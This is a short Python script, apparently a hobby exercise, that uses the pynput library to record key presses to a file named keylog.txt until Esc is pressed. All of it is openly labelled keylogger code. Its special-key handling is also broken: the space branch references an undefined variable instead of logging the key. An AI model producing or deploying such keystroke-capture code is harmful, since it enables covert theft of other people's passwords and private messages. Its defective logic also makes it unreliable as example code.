from pynput.keyboard import Key, Listener # type: ignore
# Function to write keystrokes to a log file
log_file ="keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        if key == key.space:
            with open(log_file,"a")as f:
                print(f"Error: {str(e)}")

# Function to stop the keylogger
def on_release(key):
    if key == Key.esc:
        return False

# Start listening for keystrokes
with Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press 'Esc' to stop.")
    listener.join()
